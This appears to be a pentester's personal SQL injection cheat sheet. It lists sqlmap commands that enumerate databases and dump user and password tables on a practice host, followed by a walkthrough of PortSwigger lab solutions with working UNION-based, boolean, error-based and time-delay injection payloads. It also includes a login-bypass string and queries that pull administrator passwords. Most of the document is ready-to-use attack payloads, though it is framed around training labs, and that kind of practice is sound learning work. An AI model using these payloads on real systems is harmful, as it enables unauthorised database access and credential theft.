
- Cheatsheet : https://portswigger.net/web-security/sql-injection/cheat-sheet , https://book.hacktricks.xyz/pentesting-web/sql-injection , https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection

- WAF bypasses: https://www.exploit-db.com/papers/17934

## SQL MAP

```bash
sqlmap -r login.req --level=5 --risk=3 --threads 10  --technique=B --tamper=ifnull2ifisnull,hex2char --drop-set-cookie --flush-session -p username --code=302 --dbms=mysql  --dump -D mywebsite -T siteusers


# enumerating dbs

sqlmap -u "http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1" --level=5 --risk=3 --dbs 

# enumerating tables in a db
sqlmap -u "http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1" --level=5 --risk=3 -D vn_admin --tables


# dump entire databse entries
sqlmap -u "http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1" --level=5 --risk=3 -D blog --dump

# dump specific fields in a tables 
sqlmap -u "http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1" --level=5 --risk=3 -D vn_admin -T be_users -C username,password --dump --thread 10 
```
## Types

1.  Inband : Union and Error based
2. Inferrential: Boolean and time based
3. Outbound



## PORTSWIGGER LABS

1. https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data

` /filter?category=Gifts' and released=0 -- - `

2. https://portswigger.net/web-security/sql-injection/lab-login-bypass

`username=administrator' -- `

3. https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle

`/filter?category=administrator' Union Select null,version FROM v$instance -- -`

4. https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft 

	`/filter?category=Accessories' Union Select @@version, @@version  -- -`

5. https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle
	`GET /filter?category=Accessoriese' union select schema_name , null from information_schema.schemata -- - HTTP/2`
	`GET /filter?category=Accessoriese' union select password_pdjtln, username_nfknui from users_xgxsmh -- - HTTP/2`

6. https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle
		`GET /filter?category=Accessoriese' union select table_name, null from all_tables -- - `
		`GET /filter?category=Accessoriese' union SELECT column_name,null FROM all_tab_columns WHERE table_name='USERS_VWNZMU'  -- - `
		`SELECT PASSWORD_ZYEWFI,USERNAME_CIRLNV FROM USERS_VWNZMU  -- - `

7. https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns
		`GET /filter?category=Pets' union select null,null,null-- - `

8. https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text
		`GET /filter?category=Accessories' union select null,'8oXn41',null -- - `

9. https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables
		`GET /filter?category=Accessoriees' union select username,password from users -- - `
10. https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column
		`GET /filter?category=Lifeestyle' union select null,password from users where username='administrator' -- -`

11.  https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses

	`or  (select substr(schema_name,1,1) from information_schema.schemata limit 1) = 'm'`

12. https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors

		` or (select if ((select substr(schema_name,1,1) from information_schema.schemata limit 1) = 'y', (SELECT table_name FROM information_schema.tables) , 'a'))`
		`sqlmap -r /tmp/burp.req --dbms=oracle -p TrackingId --dump --risk=3 --level=5 --proxy=http://localhost:8080`
13. https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based

		` TrackingId='or cast((select password from users limit 1)as int)=1-- -; `

14.  https://portswigger.net/web-security/sql-injection/blind/lab-time-delays
		`Cookie: TrackingId='AND 1=(SELECT 1 FROM PG_SLEEP(10)) -- -;`

15. https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval 
		[ ~/opt/custom-scripts/web/sqli-time.py ]

